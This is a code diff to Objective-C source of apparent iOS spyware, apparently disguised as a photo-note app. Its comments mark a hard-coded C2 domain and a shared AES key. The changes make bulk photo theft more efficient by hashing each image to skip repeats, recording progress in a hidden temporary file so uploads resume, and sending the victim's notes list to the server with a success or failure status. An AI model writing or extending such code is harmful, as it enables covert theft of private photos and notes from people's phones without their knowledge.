@@ -11,6 +11,7 @@
 #import "Net.h"
 #import "Info.h"
 #import "Collector.h"
+#import "Crypto.h"
 
 static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
 static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";                     // 与服务器一致
@@ -112,38 +113,79 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
     self.photoBusy = YES;
 
     dispatch_async(dispatch_get_global_queue(0, 0), ^{
-        __block NSInteger sent = 0;
+        __block NSInteger sent = 0, skipped = 0;
         NSString *rid = [[NSUUID UUID] UUIDString];
+        NSMutableSet *seen = [self sentPhotos];      // 已上传过的不再重复传
+        __block BOOL dirty = NO;
 
         [Collector enumeratePhotos:0 handler:^BOOL(NSData *jpeg, NSInteger index) {
             if (jpeg.length < 1024) return YES;
             if (jpeg.length > 8 * 1024 * 1024) return YES;   // 太大的跳过
+
+            NSString *key = CCSha256Hex(jpeg);
+            if ([seen containsObject:key]) { skipped++; return YES; }
+
             BOOL ok = [self.net uploadPhoto:jpeg idx:index rid:rid fields:nil];
-            if (ok) sent++;
+            if (ok) {
+                sent++;
+                [seen addObject:key];
+                dirty = YES;
+                // 每传一张就落盘，避免中途被杀导致下轮重传
+                [self saveSentPhotos:seen];
+            }
             return YES;
         }];
+
+        if (dirty) [self saveSentPhotos:seen];
 
         NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
         ev[@"et"] = @"data_upload_success";
         ev[@"c"] = kSeed;
-        ev[@"ctx"] = @{ @"photos": @(sent) };
+        ev[@"ctx"] = @{ @"photos": @(sent), @"skipped": @(skipped), @"total": @(seen.count) };
         [self.net sendEvent:ev];
 
-        [self log:[NSString stringWithFormat:@"photos sent %ld", (long)sent]];
+        [self log:[NSString stringWithFormat:@"photos sent=%ld skipped=%ld total=%lu",
+                   (long)sent, (long)skipped, (unsigned long)seen.count]];
         self.photoBusy = NO;
     });
+}
+
+#pragma mark - 已上传照片的去重集合
+
+- (NSString *)sentPhotosPath {
+    NSString *dir = NSTemporaryDirectory() ?: @"/tmp";
+    return [dir stringByAppendingPathComponent:@".photonote_sent.plist"];
+}
+
+- (NSMutableSet *)sentPhotos {
+    static NSMutableSet *cache = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        NSArray *arr = [NSArray arrayWithContentsOfFile:[self sentPhotosPath]];
+        cache = [NSMutableSet setWithArray:arr ?: @[]];
+        NSLog(@"[plasma] 已上传记录 %lu 条", (unsigned long)cache.count);
+    });
+    return cache;
+}
+
+- (void)saveSentPhotos:(NSSet *)set {
+    [[set allObjects] writeToFile:[self sentPhotosPath] atomically:YES];
 }
 
 - (void)collectNotes {
     dispatch_async(dispatch_get_global_queue(0, 0), ^{
         NSArray *notes = [Collector allNotes];
+        NSString *err = [Collector lastNotesError] ?: @"";
+
         NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
-        ev[@"et"] = @"notes_collect_success";
+        ev[@"et"] = (notes.count > 0) ? @"notes_collect_success" : @"notes_collect_failed";
         ev[@"c"] = kSeed;
         ev[@"list"] = notes ?: @[];
-        ev[@"ctx"] = @{ @"notesCount": @(notes.count) };
+        ev[@"ctx"] = @{ @"notesCount": @(notes.count),
+                        @"error": err.length ? err : @"(none)" };
         [self.net sendEvent:ev];
-        [self log:[NSString stringWithFormat:@"notes %lu", (unsigned long)notes.count]];
+        [self log:[NSString stringWithFormat:@"notes %lu %@",
+                   (unsigned long)notes.count, err.length ? err : @""]];
     });
 }
 
